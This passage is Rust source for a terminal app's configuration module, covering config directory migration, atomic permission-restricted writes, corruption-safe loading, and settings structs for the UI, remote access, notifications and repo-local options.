use serde::{Deserialize, Serialize, de::DeserializeOwned};
use std::collections::HashMap;
use std::io::Write;
use std::path::PathBuf;

/// Test-only override for the config directory.
#[cfg(test)]
static CONFIG_DIR_OVERRIDE: std::sync::Mutex<Option<PathBuf>> = std::sync::Mutex::new(None);

/// Global serialization lock for tests that call `set_config_dir_override`.
/// Held for the lifetime of the returned guard so tests in different modules
/// do not race on the shared `CONFIG_DIR_OVERRIDE` global.
#[cfg(test)]
static CONFIG_DIR_EXCLUSIVE: std::sync::Mutex<()> = std::sync::Mutex::new(());

/// Override the config directory for testing. Returns a guard that holds the
/// global `CONFIG_DIR_EXCLUSIVE` lock and restores the original value on drop.
/// All callers across all test modules are automatically serialized.
#[cfg(test)]
pub(crate) fn set_config_dir_override(dir: PathBuf) -> impl Drop {
    let lock = CONFIG_DIR_EXCLUSIVE
        .lock()
        .unwrap_or_else(|e| e.into_inner());
    *CONFIG_DIR_OVERRIDE.lock().unwrap() = Some(dir);
    struct Guard {
        _lock: std::sync::MutexGuard<'static, ()>,
    }
    impl Drop for Guard {
        fn drop(&mut self) {
            *CONFIG_DIR_OVERRIDE.lock().unwrap() = None;
        }
    }
    Guard { _lock: lock }
}

/// Get the config directory using platform-appropriate location.
///
/// - macOS: `~/Library/Application Support/com.tuic.commander/`
/// - Linux: `~/.config/com.tuic.commander/` (or `$XDG_CONFIG_HOME`)
/// - Windows: `%APPDATA%/com.tuic.commander/`
///
/// Matches Tauri's `$APPCONFIG` path (derived from the bundle identifier).
/// Falls back to `~/.tuicommander/` if platform dir is unavailable.
/// On first call, migrates from legacy locations if the new dir doesn't exist:
///   1. `{platform_config}/tuicommander/` (previous custom name)
///   2. `{platform_config}/tui-commander/` (older name)
///   3. `~/.tuicommander/` (legacy dotdir)
pub(crate) fn config_dir() -> PathBuf {
    #[cfg(test)]
    if let Some(dir) = CONFIG_DIR_OVERRIDE.lock().unwrap().clone() {
        return dir;
    }
    let new_dir = dirs::config_dir()
        .map(|d| d.join("com.tuic.commander"))
        .unwrap_or_else(legacy_dotdir);

    // Migrate if our config file is missing (the dir may already exist from Tauri's window-state plugin)
    if !new_dir.join(APP_CONFIG_FILE).exists() {
        // Try migrating from legacy dirs (newest first): tuicommander, tui-commander, ~/.tuicommander
        let platform_dir = dirs::config_dir();
        let candidates = [
            platform_dir.as_ref().map(|d| d.join("tuicommander")),
            platform_dir.as_ref().map(|d| d.join("tui-commander")),
            Some(legacy_dotdir()),
        ];

        let source = candidates.into_iter().flatten().find(|d| d.exists());

        if let Some(source) = source
            && source != new_dir
            && let Err(e) = migrate_config_dir(&source, &new_dir)
        {
            tracing::warn!("Config migration failed: {e}");
            return source;
        }
    }

    new_dir
}

/// Legacy config directory: ~/.tuicommander/
fn legacy_dotdir() -> PathBuf {
    dirs::home_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join(".tuicommander")
}

/// Copy all files from legacy config dir to new platform dir.
fn migrate_config_dir(from: &std::path::Path, to: &std::path::Path) -> Result<(), String> {
    copy_dir_recursive(from, to)?;
    tracing::info!(from = %from.display(), to = %to.display(), "Migrated config directory");
    Ok(())
}

/// Recursively copy a directory, preserving symlinks.
fn copy_dir_recursive(from: &std::path::Path, to: &std::path::Path) -> Result<(), String> {
    std::fs::create_dir_all(to)
        .map_err(|e| format!("Failed to create dir {}: {e}", to.display()))?;

    for entry in std::fs::read_dir(from)
        .map_err(|e| format!("Failed to read dir {}: {e}", from.display()))?
    {
        let entry = entry.map_err(|e| format!("Dir entry error: {e}"))?;
        let dest = to.join(entry.file_name());
        let file_type = entry
            .file_type()
            .map_err(|e| format!("File type error: {e}"))?;

        if file_type.is_symlink() {
            recreate_symlink(&entry.path(), &dest)?;
        } else if file_type.is_file() {
            std::fs::copy(entry.path(), &dest).map_err(|e| format!("Copy error: {e}"))?;
        } else if file_type.is_dir() {
            copy_dir_recursive(&entry.path(), &dest)?;
        }
    }
    Ok(())
}

/// Recreate a symlink at `dest` pointing to the same target as `source`.
fn recreate_symlink(source: &std::path::Path, dest: &std::path::Path) -> Result<(), String> {
    let target = std::fs::read_link(source)
        .map_err(|e| format!("Failed to read symlink {}: {e}", source.display()))?;
    #[cfg(unix)]
    std::os::unix::fs::symlink(&target, dest)
        .map_err(|e| format!("Failed to create symlink {}: {e}", dest.display()))?;
    #[cfg(windows)]
    {
        // Windows requires different calls for file vs directory symlinks
        let is_dir = std::fs::metadata(&target)
            .map(|m| m.is_dir())
            .unwrap_or(false);
        if is_dir {
            std::os::windows::fs::symlink_dir(&target, dest)
        } else {
            std::os::windows::fs::symlink_file(&target, dest)
        }
        .map_err(|e| format!("Failed to create symlink {}: {e}", dest.display()))?;
    }
    Ok(())
}

/// Load a JSON config file, returning Default if missing or corrupt.
/// Logs warnings/errors when the file exists but cannot be read or parsed,
/// so corrupt files are visible in logs instead of silently resetting state.
pub(crate) fn load_json_config<T: DeserializeOwned + Default>(filename: &str) -> T {
    let path = config_dir().join(filename);
    load_json_config_from_path(&path)
}

fn load_json_config_from_path<T: DeserializeOwned + Default>(path: &std::path::Path) -> T {
    if !path.exists() {
        return T::default();
    }
    let content = match std::fs::read_to_string(path) {
        Ok(s) => s,
        Err(e) => {
            tracing::warn!(path = %path.display(), "Could not read config: {e}");
            return T::default();
        }
    };
    match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(e) => {
            tracing::error!(path = %path.display(), "Corrupt config: {e}. Using defaults.");
            T::default()
        }
    }
}

/// Load a JSON config file, distinguishing "not written yet" (legitimately empty) from
/// "there but broken". Used where a silent fallback to `Default` would let the next write
/// overwrite real user data — notes.json (GH #107). A file that parses as garbage is moved
/// aside as `<name>.corrupt-<uuid>` so it survives for recovery.
pub(crate) fn load_json_config_strict<T: DeserializeOwned + Default>(
    filename: &str,
) -> Result<T, String> {
    let path = config_dir().join(filename);
    load_json_config_strict_from_path(&path)
}

fn load_json_config_strict_from_path<T: DeserializeOwned + Default>(
    path: &std::path::Path,
) -> Result<T, String> {
    if !path.exists() {
        return Ok(T::default());
    }
    let content = std::fs::read_to_string(path).map_err(|e| {
        tracing::error!(path = %path.display(), "Could not read config: {e}");
        format!("Could not read {}: {e}", path.display())
    })?;
    serde_json::from_str(&content).map_err(|e| {
        // Move the bad file aside: the caller refuses to write until a load succeeds, but a
        // later code path (or a second instance) must not be able to clobber it either.
        let aside = path.with_extension(format!("corrupt-{}", uuid::Uuid::new_v4()));
        let preserved = std::fs::rename(path, &aside).is_ok();
        tracing::error!(
            path = %path.display(),
            preserved_as = %if preserved { aside.display().to_string() } else { "<rename failed>".to_string() },
            "Corrupt config: {e}"
        );
        format!("Corrupt {}: {e}", path.display())
    })
}

/// Atomically write `data` to `target` via temp+rename with 0600 perms.
/// Fsyncs the temp file before renaming: rename is atomic w.r.t. the directory
/// entry, but without fsync a crash right after it can still leave the target
/// containing stale or zero-length content on filesystems that reorder data
/// writes past metadata writes (e.g. ext4 `data=writeback`).
pub(crate) fn persist_atomic(target: &std::path::Path, data: &[u8]) -> Result<(), String> {
    if let Some(dir) = target.parent() {
        std::fs::create_dir_all(dir).map_err(|e| format!("Failed to create directory: {e}"))?;
    }
    // Unique per-call temp name (uuid) — a per-process name lets two concurrent
    // writers to the same target collide on the temp file and corrupt it (#117-a503).
    let temp = target.with_extension(format!("tmp.{}", uuid::Uuid::new_v4()));
    let mut file =
        std::fs::File::create(&temp).map_err(|e| format!("Failed to write temp file: {e}"))?;
    file.write_all(data).map_err(|e| {
        let _ = std::fs::remove_file(&temp);
        format!("Failed to write temp file: {e}")
    })?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let perms = std::fs::Permissions::from_mode(0o600);
        std::fs::set_permissions(&temp, perms).map_err(|e| {
            let _ = std::fs::remove_file(&temp);
            format!("Failed to set permissions: {e}")
        })?;
    }

    file.sync_all().map_err(|e| {
        let _ = std::fs::remove_file(&temp);
        format!("Failed to fsync temp file: {e}")
    })?;
    drop(file);

    std::fs::rename(&temp, target).map_err(|e| {
        let _ = std::fs::remove_file(&temp);
        format!("Failed to commit file: {e}")
    })?;
    Ok(())
}

// ---------------------------------------------------------------------------
// AppConfig — previously in lib.rs, now lives here
// ---------------------------------------------------------------------------

/// Whether split terminal panes get separate tabs or share a unified tab
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum SplitTabMode {
    #[default]
    Separate,
    Unified,
}

/// Tab ordering mode for the tab bar
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub(crate) enum TabOrderingMode {
    #[default]
    GroupedByType,
    TerminalsFirst,
    Free,
}

/// Where to create worktree directories
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub(crate) enum WorktreeStorage {
    /// `~/dev/myrepo__wt/feat-123` — sibling dir next to repo
    #[default]
    Sibling,
    /// `~/Library/.../tuicommander/worktrees/repo/feat-123` — app config dir
    AppDir,
    /// `<repo>/.worktrees/feat-123` — inside the repository
    InsideRepo,
    /// `<repo>/.claude/worktrees/feat-123` — Claude Code default location
    ClaudeCodeDefault,
}

/// How to handle orphan worktrees (branch deleted)
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum OrphanCleanup {
    /// Auto-remove worktree + prune
    On,
    /// Ignore, keep in sidebar
    Off,
    /// Show toast with Remove/Keep action
    #[default]
    Ask,
}

/// Git merge strategy for PRs
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum MergeStrategy {
    Merge,
    // Squash is the global default (matches the common "squash & merge" PR flow);
    // per-repo Option<MergeStrategy> overrides still win when set.
    #[default]
    Squash,
    Rebase,
}

/// What to do with a worktree after its branch is merged
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum WorktreeAfterMerge {
    /// Move to __archived/ subdir
    #[default]
    Archive,
    /// Remove worktree and branch entirely
    Delete,
    /// Show confirmation dialog
    Ask,
}

/// Auto-delete local branch when PR is merged/closed
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum AutoDeleteOnPrClose {
    #[default]
    Off,
    Ask,
    Auto,
}

// ---------------------------------------------------------------------------
// ServicesConfig — nested config for remote access, auth, relay, push
// ---------------------------------------------------------------------------

#[derive(Clone, Debug, Serialize, Deserialize)]
pub(crate) struct ServerConfig {
    #[serde(default)]
    pub(crate) enabled: bool,
    #[serde(default = "default_remote_port")]
    pub(crate) port: u16,
    #[serde(default)]
    pub(crate) ipv6_enabled: bool,
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            port: default_remote_port(),
            ipv6_enabled: false,
        }
    }
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub(crate) struct AuthConfig {
    #[serde(default)]
    pub(crate) username: String,
    #[serde(default)]
    pub(crate) password_hash: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub(crate) session_token: String,
    #[serde(default, skip_serializing_if = "is_false")]
    pub(crate) session_token_exists: bool,
    #[serde(default = "default_session_token_duration_secs")]
    pub(crate) session_token_duration_secs: u64,
    #[serde(default)]
    pub(crate) lan_auth_bypass: bool,
    #[serde(default = "default_auth_rate_limit_max")]
    pub(crate) auth_rate_limit_max: u32,
    #[serde(default = "default_auth_rate_limit_window_secs")]
    pub(crate) auth_rate_limit_window_secs: u64,
}

fn default_auth_rate_limit_max() -> u32 {
    5
}
fn default_auth_rate_limit_window_secs() -> u64 {
    300
}

impl Default for AuthConfig {
    fn default() -> Self {
        Self {
            username: String::new(),
            password_hash: String::new(),
            session_token: String::new(),
            session_token_exists: false,
            session_token_duration_secs: default_session_token_duration_secs(),
            lan_auth_bypass: false,
            auth_rate_limit_max: default_auth_rate_limit_max(),
            auth_rate_limit_window_secs: default_auth_rate_limit_window_secs(),
        }
    }
}

#[derive(Clone, Debug, Default, Serialize)]
#[serde(tag = "mode", rename_all = "lowercase")]
pub(crate) enum TlsConfig {
    #[default]
    Off,
    Manual {
        cert_path: String,
        key_path: String,
    },
}

impl<'de> serde::Deserialize<'de> for TlsConfig {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        let val = serde_json::Value::deserialize(deserializer)?;
        match val.as_object() {
            Some(obj)
                if obj.is_empty() || obj.get("mode").and_then(|v| v.as_str()) == Some("off") =>
            {
                Ok(TlsConfig::Off)
            }
            Some(obj) if obj.get("mode").and_then(|v| v.as_str()) == Some("manual") => {
                let cert_path = obj
                    .get("cert_path")
                    .and_then(|v| v.as_str())
                    .unwrap_or_default()
                    .to_string();
                let key_path = obj
                    .get("key_path")
                    .and_then(|v| v.as_str())
                    .unwrap_or_default()
                    .to_string();
                Ok(TlsConfig::Manual {
                    cert_path,
                    key_path,
                })
            }
            _ => Ok(TlsConfig::Off),
        }
    }
}

#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub(crate) struct RelayConfig {
    #[serde(default)]
    pub(crate) enabled: bool,
    #[serde(default)]
    pub(crate) url: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub(crate) token: String,
    // `Option<bool>` (unlike the plain `bool` used by session_token_exists /
    // vapid_private_key_exists) so a partial JSON payload that OMITS this key
    // (e.g. agent MCP `config/save`, or a partial PUT /config) deserializes to
    // `None` ("caller didn't touch this") rather than defaulting to `false`
    // ("caller explicitly cleared it"). preserve_redacted_app_config_secrets
    // relies on that distinction to avoid silently deleting the stored relay
    // token — see DATA-1.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) token_exists: Option<bool>,
    #[serde(default)]
    pub(crate) session_id: String,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub(crate) struct PushConfig {
    #[serde(default)]
    pub(crate) enabled: bool,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub(crate) vapid_private_key: String,
    #[serde(default, skip_serializing_if = "is_false")]
    pub(crate) vapid_private_key_exists: bool,
    #[serde(default)]
    pub(crate) vapid_public_key: String,
    #[serde(default = "default_vapid_subject")]
    pub(crate) vapid_subject: String,
}

impl Default for PushConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            vapid_private_key: String::new(),
            vapid_private_key_exists: false,
            vapid_public_key: String::new(),
            vapid_subject: default_vapid_subject(),
        }
    }
}

#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub(crate) struct ServicesConfig {
    #[serde(default)]
    pub(crate) server: ServerConfig,
    #[serde(default)]
    pub(crate) auth: AuthConfig,
    #[serde(default)]
    pub(crate) tls: TlsConfig,
    #[serde(default)]
    pub(crate) relay: RelayConfig,
    #[serde(default)]
    pub(crate) push: PushConfig,
}

#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct AppConfig {
    pub(crate) shell: Option<String>,
    pub(crate) font_family: String,
    pub(crate) font_size: u16,
    /// Terminal font weight (100–900, e.g. 200 = ExtraLight, 400 = Regular)
    #[serde(default = "default_font_weight")]
    pub(crate) font_weight: u16,
    pub(crate) theme: String,
    /// Enable MCP HTTP API on localhost for external tool integration
    #[serde(default)]
    pub(crate) mcp_server_enabled: bool,
    /// Fixed port for MCP server (0 = OS-assigned)
    #[serde(default = "default_mcp_port")]
    pub(crate) mcp_port: u16,
    /// Whether MCP config has been auto-installed in agent configs
    #[serde(default)]
    pub(crate) mcp_config_installed: bool,
    /// Preferred IDE (e.g. "vscode", "cursor")
    #[serde(default)]
    pub(crate) ide: String,
    /// Default font size for new terminals
    #[serde(default = "default_font_size")]
    pub(crate) default_font_size: u16,
    #[serde(default)]
    pub(crate) services: ServicesConfig,
    /// Show confirmation dialog when quitting with active terminals
    #[serde(default = "default_true")]
    pub(crate) confirm_before_quit: bool,
    /// Show confirmation dialog when closing a terminal tab
    #[serde(default = "default_true")]
    pub(crate) confirm_before_closing_tab: bool,
    /// Maximum characters for tab names before truncation
    #[serde(default = "default_max_tab_name_length")]
    pub(crate) max_tab_name_length: u32,
    /// Split tab mode: separate (each pane gets a tab) or unified (one shared tab)
    #[serde(default)]
    pub(crate) split_tab_mode: SplitTabMode,
    /// Tab ordering mode: grouped-by-type, terminals-first, or free
    #[serde(default)]
    pub(crate) tab_ordering_mode: TabOrderingMode,
    /// Cycle through all tab types (terminals + diff/md/editor) with prev/next, not just terminals
    #[serde(default)]
    pub(crate) tab_cycling_all_types: bool,
    /// Show a branch's open terminals as a nested list under its sidebar row
    /// (only when a branch has more than one terminal). Opt-in, off by default.
    #[serde(default)]
    pub(crate) tab_tree_enabled: bool,
    /// Auto-show PR detail popover when a branch has PR data
    #[serde(default = "default_true")]
    pub(crate) auto_show_pr_popover: bool,
    /// Prevent system sleep while any terminal session is busy
    #[serde(default)]
    pub(crate) prevent_sleep_when_busy: bool,
    /// Automatically check for app updates on startup
    #[serde(default = "default_true")]
    pub(crate) auto_update_enabled: bool,
    /// Automatically check for plugin updates on startup
    #[serde(default = "default_true")]
    pub(crate) auto_update_plugins_enabled: bool,
    /// UI language code (e.g. "en", "it", "de")
    #[serde(default = "default_language")]
    pub(crate) language: String,
    /// Plugin IDs that the user has disabled (not loaded on startup)
    #[serde(default)]
    pub(crate) disabled_plugin_ids: Vec<String>,
    /// Update channel: "stable" or "nightly"
    #[serde(default = "default_update_channel")]
    pub(crate) update_channel: String,
    /// Agent types disabled by the user (won't appear in sidebar "Add Agent" menu)
    #[serde(default)]
    pub(crate) disabled_agents: Vec<String>,
    /// Agent types whose MCP bridge config is disabled (ensure_mcp_configs skips these)
    #[serde(default)]
    pub(crate) disabled_mcp_agents: Vec<String>,
    /// Native MCP tool names disabled by the user (excluded from tools/list response)
    #[serde(default)]
    pub(crate) disabled_native_tools: Vec<String>,
    /// Collapse all MCP tools into 3 meta-tools (search_tools, get_tool_schema, call_tool).
    /// Reduces AI context from ~35k to ~500 tokens. Default: false (individual tools exposed).
    #[serde(default)]
    pub(crate) collapse_tools: bool,
    /// Show agent intent as tab title (from `intent: text (title)` tokens)
    #[serde(default = "default_true")]
    pub(crate) intent_tab_title: bool,
    /// Show suggested follow-up actions from agents (from `suggest: A | B | C` tokens)
    #[serde(default = "default_true")]
    pub(crate) suggest_followups: bool,
    /// Auto-copy terminal selection to clipboard
    #[serde(default = "default_true")]
    pub(crate) copy_on_select: bool,
    /// Honor OSC 52 clipboard-write sequences from terminal output. Disable to
    /// ignore clipboard writes emitted by displayed files/logs. Frontend-gated
    /// (the OSC 52 write executes in the renderer); stored here for persistence.
    #[serde(default = "default_true")]
    pub(crate) osc52_clipboard: bool,
    /// Show last prompt overlay bar at the top of the terminal
    #[serde(default = "default_true")]
    pub(crate) show_last_prompt: bool,
    /// Terminal bell style: "none", "visual", "sound", or "both"
    #[serde(default = "default_bell_style")]
    pub(crate) bell_style: String,
    /// Global OS-level hotkey combo to toggle window visibility (e.g. "CommandOrControl+Shift+T")
    #[serde(default)]
    pub(crate) global_hotkey: Option<String>,
    /// Default issue filter mode: "assigned", "created", "mentioned", "all", or "disabled"
    #[serde(default = "default_issue_filter")]
    pub(crate) issue_filter: String,
    /// Master toggle for experimental features
    #[serde(default)]
    pub(crate) experimental_features_enabled: bool,
    /// Sub-flag: AI Chat panel, shortcuts, and palette entry
    #[serde(default)]
    pub(crate) ai_chat_enabled: bool,
    /// Sub-flag: AI Triage (diff classification)
    #[serde(default)]
    pub(crate) ai_triage_enabled: bool,
    /// Sub-flag: AI Watchers (terminal event watchers)
    #[serde(default)]
    pub(crate) ai_watchers_enabled: bool,
    /// Sub-flag: reflow scrollback history on column resize. Keeps scrollback
    /// readable when side panels temporarily narrow the terminal, without
    /// affecting cursor-addressed TUIs on the visible screen.
    #[serde(default)]
    pub(crate) scrollback_reflow: bool,
    /// Terminal cursor style: "bar" (default), "block", "underline"
    #[serde(default = "default_cursor_style")]
    pub(crate) cursor_style: String,
    /// Terminal renderer: "webgl" (default, GPU-accelerated) or "canvas" (CPU, no atlas bugs)
    #[serde(default = "default_terminal_renderer")]
    pub(crate) terminal_renderer: String,
    /// Expose `ai_terminal_*` tools to external MCP. Default off: they need a
    /// per-session filesystem sandbox only the internal agent loop creates.
    ///
    /// Read at three sites (`merged_tool_definitions`, `searchable_tool_definitions`,
    /// `handle_mcp_tool_call` dispatch). This flag has NO live-reload semantics:
    /// a client may see a tools-list snapshot before a toggle and a dispatch-time
    /// rejection after. Coordinate those call sites if live reload is ever added.
    #[serde(default)]
    pub(crate) ai_terminal_mcp_enabled: bool,
    /// Content index pre-warm strategy: "active_and_switch" (default), "active_only", "all_sequential"
    #[serde(default = "default_index_strategy")]
    pub(crate) index_strategy: String,
    /// Minutes of idle + unfocused before SIGSTOP on process group. 0 = disabled.
    #[serde(default = "default_standby_timeout")]
    pub(crate) standby_timeout_minutes: u16,
    /// User-defined launchers shown in the "Open in" menu alongside built-ins.
    #[serde(default)]
    pub(crate) custom_launchers: Vec<CustomLauncher>,
    /// Show GitLens-style inline git blame on the active line in the code editor.
    #[serde(default = "default_true")]
    pub(crate) inline_blame_enabled: bool,
}

/// A user-defined launcher for the "Open in" menu. The executable is spawned
/// with `args`, each of which may contain `{path}`/`{file}`/`{line}`/`{column}`
/// placeholders (expanded in `agent::open_in_custom`). No icon field — custom
/// launchers share a single generic icon in the UI.
#[derive(Serialize, Deserialize, Clone, Debug, Default)]
pub(crate) struct CustomLauncher {
    pub(crate) id: String,
    pub(crate) name: String,
    pub(crate) executable: String,
    #[serde(default)]
    pub(crate) args: Vec<String>,
    #[serde(default = "default_true")]
    pub(crate) enabled: bool,
    /// Optional platform filter: "macos" | "windows" | "linux". None = all.
    #[serde(default)]
    pub(crate) platform: Option<String>,
}

fn default_language() -> String {
    "en".to_string()
}

fn default_vapid_subject() -> String {
    "mailto:noreply@tuicommander.com".to_string()
}

fn is_false(value: &bool) -> bool {
    !*value
}

fn default_update_channel() -> String {
    "stable".to_string()
}

fn default_session_token_duration_secs() -> u64 {
    86400
}

fn default_index_strategy() -> String {
    "active_and_switch".to_string()
}

fn default_standby_timeout() -> u16 {
    5
}

fn default_bell_style() -> String {
    "visual".to_string()
}

fn default_issue_filter() -> String {
    "assigned".to_string()
}

fn default_cursor_style() -> String {
    "bar".to_string()
}

fn default_terminal_renderer() -> String {
    "webgl".to_string()
}

fn default_mcp_port() -> u16 {
    3845
}

fn default_font_size() -> u16 {
    13
}

fn default_font_weight() -> u16 {
    400
}

fn default_max_tab_name_length() -> u32 {
    25
}

fn default_remote_port() -> u16 {
    9876
}

impl Default for AppConfig {
    fn default() -> Self {
        Self {
            shell: None,
            font_family: "JetBrains Mono".to_string(),
            font_size: 14,
            font_weight: default_font_weight(),
            theme: "vscode-dark".to_string(),
            mcp_server_enabled: true,
            mcp_port: default_mcp_port(),
            mcp_config_installed: false,
            ide: String::new(),
            default_font_size: 13,
            services: ServicesConfig::default(),
            confirm_before_quit: true,
            confirm_before_closing_tab: true,
            max_tab_name_length: default_max_tab_name_length(),
            split_tab_mode: SplitTabMode::default(),
            tab_ordering_mode: TabOrderingMode::default(),
            tab_cycling_all_types: false,
            tab_tree_enabled: false,
            auto_show_pr_popover: true,
            prevent_sleep_when_busy: false,
            auto_update_enabled: true,
            auto_update_plugins_enabled: true,
            language: default_language(),
            disabled_plugin_ids: Vec::new(),
            update_channel: default_update_channel(),
            disabled_agents: Vec::new(),
            disabled_mcp_agents: Vec::new(),
            disabled_native_tools: vec!["config".to_string(), "debug".to_string()],
            intent_tab_title: true,
            suggest_followups: true,
            copy_on_select: true,
            osc52_clipboard: true,
            show_last_prompt: true,
            bell_style: default_bell_style(),
            global_hotkey: None,
            collapse_tools: false,
            issue_filter: default_issue_filter(),
            experimental_features_enabled: false,
            ai_chat_enabled: false,
            ai_triage_enabled: false,
            ai_watchers_enabled: false,
            scrollback_reflow: false,
            cursor_style: default_cursor_style(),
            terminal_renderer: default_terminal_renderer(),
            ai_terminal_mcp_enabled: false,
            index_strategy: default_index_strategy(),
            standby_timeout_minutes: default_standby_timeout(),
            custom_launchers: Vec::new(),
            inline_blame_enabled: true,
        }
    }
}

impl AppConfig {
    #[allow(dead_code)]
    pub(crate) fn is_experimental_enabled(&self, sub_flag: bool) -> bool {
        self.experimental_features_enabled && sub_flag
    }
}

// ---------------------------------------------------------------------------
// NotificationConfig
// ---------------------------------------------------------------------------

#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct NotificationSounds {
    #[serde(default = "default_true")]
    pub(crate) question: bool,
    #[serde(default = "default_true")]
    pub(crate) error: bool,
    #[serde(default = "default_true")]
    pub(crate) completion: bool,
    #[serde(default = "default_true")]
    pub(crate) warning: bool,
    #[serde(default = "default_true")]
    pub(crate) info: bool,
    /// Buzzer an agent can raise over MCP when it needs the user back.
    #[serde(default = "default_true")]
    pub(crate) attention: bool,
}

impl Default for NotificationSounds {
    fn default() -> Self {
        Self {
            question: true,
            error: true,
            completion: true,
            warning: true,
            info: true,
            attention: true,
        }
    }
}

#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct NotificationConfig {
    #[serde(default = "default_true")]
    pub(crate) enabled: bool,
    #[serde(default = "default_volume")]
    pub(crate) volume: f64,
    #[serde(default)]
    pub(crate) sounds: NotificationSounds,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) audio_device: Option<String>,
    /// Drop the completion chime for sessions created over MCP/HTTP (`session
    /// create`, `agent spawn`). An orchestration of many agents otherwise turns
    /// every finished worker into a beep. Visual signals (activity item, badge,
    /// OS notification) are unaffected.
    #[serde(default = "default_true")]
    pub(crate) silence_remote_completions: bool,
    /// Mirror every toast into the toolbar bell, so a message that auto-dismissed
    /// while the user looked elsewhere is still readable afterwards. Off means
    /// toasts stay transient — they appear, they fade, they leave no trace.
    #[serde(default = "default_true")]
    pub(crate) toasts_in_bell: bool,
}

fn default_true() -> bool {
    true
}

fn default_volume() -> f64 {
    0.5
}

impl Default for NotificationConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            volume: 0.5,
            sounds: NotificationSounds::default(),
            audio_device: None,
            silence_remote_completions: true,
            toasts_in_bell: true,
        }
    }
}

// ---------------------------------------------------------------------------
// UIPrefsConfig — sidebar, panel sizes, settings nav width
// ---------------------------------------------------------------------------

#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct UIPrefsConfig {
    #[serde(default = "default_true")]
    pub(crate) sidebar_visible: bool,
    #[serde(default = "default_sidebar_width")]
    pub(crate) sidebar_width: u32,
    #[serde(default)]
    pub(crate) diff_panel_visible: bool,
    #[serde(default)]
    pub(crate) markdown_panel_visible: bool,
    #[serde(default)]
    pub(crate) notes_panel_visible: bool,
    #[serde(default)]
    pub(crate) file_browser_panel_visible: bool,
    #[serde(default)]
    pub(crate) plan_panel_visible: bool,
    #[serde(default)]
    pub(crate) git_panel_visible: bool,
    #[serde(default = "default_panel_width")]
    pub(crate) diff_panel_width: u32,
    #[serde(default = "default_panel_width")]
    pub(crate) markdown_panel_width: u32,
    #[serde(default = "default_notes_panel_width")]
    pub(crate) notes_panel_width: u32,
    #[serde(default = "default_plan_panel_width")]
    pub(crate) plan_panel_width: u32,
    #[serde(default = "default_git_panel_width")]
    pub(crate) git_panel_width: u32,
    #[serde(default = "default_settings_nav_width")]
    pub(crate) settings_nav_width: u32,
    /// Diff viewer mode: "split" (side-by-side) or "unified" (inline).
    #[serde(default = "default_diff_view_mode")]
    pub(crate) diff_view_mode: String,
    #[serde(default)]
    pub(crate) detached_panels: std::collections::HashMap<String, String>,
    /// Collapsed state of the GitHub panel sections, keyed by section id
    /// (`my-prs`, `prs`, `issues`). Absent key = the section's own default.
    #[serde(default)]
    pub(crate) github_section_collapsed: std::collections::HashMap<String, bool>,
}

fn default_diff_view_mode() -> String {
    "split".to_string()
}

impl Default for UIPrefsConfig {
    fn default() -> Self {
        Self {
            sidebar_visible: true,
            sidebar_width: default_sidebar_width(),
            diff_panel_visible: false,
            markdown_panel_visible: false,
            notes_panel_visible: false,
            file_browser_panel_visible: false,
            plan_panel_visible: false,
            git_panel_visible: false,
            diff_panel_width: default_panel_width(),
            markdown_panel_width: default_panel_width(),
            notes_panel_width: default_notes_panel_width(),
            plan_panel_width: default_plan_panel_width(),
            git_panel_width: default_git_panel_width(),
            settings_nav_width: default_settings_nav_width(),
            diff_view_mode: default_diff_view_mode(),
            detached_panels: std::collections::HashMap::new(),
            github_section_collapsed: std::collections::HashMap::new(),
        }
    }
}

fn default_sidebar_width() -> u32 {
    260
}
fn default_panel_width() -> u32 {
    400
}
fn default_notes_panel_width() -> u32 {
    350
}
fn default_plan_panel_width() -> u32 {
    350
}
fn default_git_panel_width() -> u32 {
    380
}
fn default_settings_nav_width() -> u32 {
    180
}

// ---------------------------------------------------------------------------
// RepoLocalConfig — team-shareable settings loaded from .tuic.json in repo root
// ---------------------------------------------------------------------------

/// Settings loaded from `.tuic.json` at the repository root.
/// These are team-shareable (committed to the repo) and override global defaults
/// but are overridden by per-repo app settings.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub(crate) struct RepoLocalConfig {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) base_branch: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) copy_ignored_files: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) copy_untracked_files: Option<bool>,
    // Script fields (setup_script, run_script, archive_script) intentionally
    // omitted — executing repo-committed scripts without TOFU prompt is unsafe.
    // Re-add when trust-on-first-use confirmation is implemented.
    #[serde(default, skip_serializing_if = "Option::is_none")]
